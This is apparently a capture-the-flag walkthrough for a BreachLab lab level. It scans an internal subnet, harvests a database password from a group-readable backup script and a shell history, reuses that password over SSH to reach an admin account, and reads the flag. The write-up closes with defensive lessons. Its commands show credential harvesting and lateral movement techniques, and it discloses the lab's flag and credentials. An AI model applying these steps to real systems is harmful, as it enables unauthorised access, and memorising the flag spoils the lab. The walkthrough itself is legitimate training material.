# BreachLab - Phantom Track: Level 18 (Credential Spray)

## General Information

- **Platform:** [BreachLab](https://breachlab.org)
- **Track:** Phantom Track (Post-Exploitation & Operational Tradecraft)
- **Level:** Level 18 (Credential Spray)
- **Host:** `204.168.229.209`
- **Port:** `2223`
- **Current User:** `phantom18` (`10.13.37.2`)
- **Target Host:** `10.13.37.20` (`db-srv`)
- **Goal:** Harvest leaked administrative credentials from group-readable backup scripts and history files (`/usr/local/bin/backup-runner.sh`, `/home/svc_backup/.bash_history`), perform lateral movement via SSH password spray to `dbadmin@10.13.37.20`, and retrieve the flag from `~/spray_loot/reused_creds.txt`
- **Next User / Flag Code:** `bl_phtm18_37f237428cf2b288`

---

## 1. Scenario & Objectives

Upon logging in via SSH, the MOTD banner and `BRIEFING` detail the mission parameters:

```
MISSION: Credential Spray
========================

You already hold credentials harvested on this host. Operators reuse
passwords. See if any of yours work on an internal host that has an
admin account with a hint of "backup" about it.

You are looking for a reused pair, not a cracked one. When you land
the right login, the flag is sitting in that account's home.
```

The objective is to audit the local filesystem for credentials held by or accessible to `phantom18`, identify password reuse across adjacent internal database hosts (`10.13.37.20`), authenticate as `dbadmin`, and harvest the target flag.

---

## 2. Reconnaissance & Internal Network Discovery

Inspecting local routes, interfaces, and known SSH hosts:

```bash
phantom18@phantom:~$ ip route
default via 172.20.0.1 dev eth1
10.13.37.0/24 dev eth0 proto kernel scope link src 10.13.37.2
172.20.0.0/16 dev eth1 proto kernel scope link src 172.20.0.3

phantom18@phantom:~$ nmap -Pn -n -p22 --open 10.13.37.0/24
Nmap scan report for 10.13.37.10 (open)
Nmap scan report for 10.13.37.20 (open)
Nmap scan report for 10.13.37.30 (open)
```

- Target hosts in the internal network with SSH listening: `10.13.37.10` (`web-srv`), `10.13.37.20` (`db-srv`), `10.13.37.30` (`ops-srv`).

---

## 3. Credential Harvesting & Group Privilege Auditing

Searching for files owned by or group-accessible to `phantom18` across the filesystem:

```bash
phantom18@phantom:~$ find / -xdev -type f \( -user phantom18 -o -group phantom18 \) -printf '%M %u:%g %s %p\n' 2>/dev/null
-rw-r----- svc_backup:phantom18 3590 /home/svc_backup/.bash_history
-rwxr-x--- root:phantom18 240 /usr/local/bin/backup-runner.sh
```

### Analyzing Harvested Scripts & Histories

Inspecting `/usr/local/bin/backup-runner.sh`:

```bash
phantom18@phantom:~$ cat /usr/local/bin/backup-runner.sh
#!/bin/bash
# Nightly DB backup runner — phantom-db (10.13.37.20).
# TODO: migrate to ~/.pgpass once DBA confirms ticket OPS-491.
export PGPASSWORD='B4ckup_K3y_S3cr3t'
pg_dump -h 10.13.37.20 -U dbadmin -d production > /var/backups/db.sql
```

Inspecting `/home/svc_backup/.bash_history`:

```bash
phantom18@phantom:~$ cat /home/svc_backup/.bash_history
cd /opt/backups
psql -h 10.13.37.20 -U dbadmin -W production
B4ckup_K3y_S3cr3t
...
```

- **Discovered Credentials:** User `dbadmin`, Password `B4ckup_K3y_S3cr3t` targeting database host `10.13.37.20`.

---

## 4. Lateral Movement via Password Reuse (SSH)

Testing the harvested credential pair `dbadmin:B4ckup_K3y_S3cr3t` against SSH on `10.13.37.20`:

```bash
phantom18@phantom:~$ ssh dbadmin@10.13.37.20
dbadmin@10.13.37.20's password: B4ckup_K3y_S3cr3t

Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-134-generic x86_64)
dbadmin@db-srv:~$ id
uid=1000(dbadmin) gid=1000(dbadmin) groups=1000(dbadmin)
```

---

## 5. Loot Collection & Flag Extraction

Navigating the target user's home directory:

```bash
dbadmin@db-srv:~$ ls -la
total 36
drwxr-x--- 1 dbadmin dbadmin 4096 Jul 20 13:54 .
drwxr-xr-x 1 root    root    4096 May 23 18:19 ..
drwx------ 2 dbadmin dbadmin 4096 May 23 18:19 spray_loot

dbadmin@db-srv:~$ cd spray_loot/
dbadmin@db-srv:~/spray_loot$ cat reused_creds.txt
bl_phtm18_37f237428cf2b288
```

- **Extracted Flag:** `bl_phtm18_37f237428cf2b288`

---

## 6. Flag / Credentials Retrieved

| Parameter | Value |
| :--- | :--- |
| **Track** | Phantom Track (Level 18) |
| **Current User** | `phantom18` (`10.13.37.2`) |
| **Target Host** | `10.13.37.20` (`dbadmin@db-srv`) |
| **Vulnerability Type** | Hardcoded Credentials in Scripts & Shell Histories / Password Reuse |
| **Harvested Credentials** | `dbadmin` : `B4ckup_K3y_S3cr3t` |
| **Source Artifacts** | `/usr/local/bin/backup-runner.sh`, `/home/svc_backup/.bash_history` |
| **Discovered Flag** | `bl_phtm18_37f237428cf2b288` |

---

## 7. Key Commands & Concepts Reference

- `find / -xdev -type f \( -user <user> -o -group <group> \)`: Find all files owned by or assigned to a specific group across the filesystem.
- `export PGPASSWORD='...'`: Common environment variable used to script non-interactive PostgreSQL authentication.
- `ssh <user>@<host>`: Test lateral credential spraying over SSH against adjacent hosts in the internal subnet.

---

## 8. Lessons Learned & Defensive Takeaways

1. **Avoid Hardcoded Secrets in Maintenance Scripts:** Placing database credentials directly into bash scripts (`export PGPASSWORD=...`) exposes them to anyone with read permissions on the script or filesystem backups. Use secure secret management or restricted `.pgpass` files with `600` permissions.
2. **Sanitize Shell Histories for Service Accounts:** Service accounts (`svc_backup`) should have history logging disabled (`export HISTFILE=/dev/null`) to prevent interactive passwords entered at prompts from spilling into plaintext `.bash_history`.
3. **Prevent Password Reuse Across Security Boundaries:** Using the same password for database services (`PostgreSQL`) and system-level user accounts (`SSH`) enables immediate privilege escalation and lateral movement upon single-layer compromise.
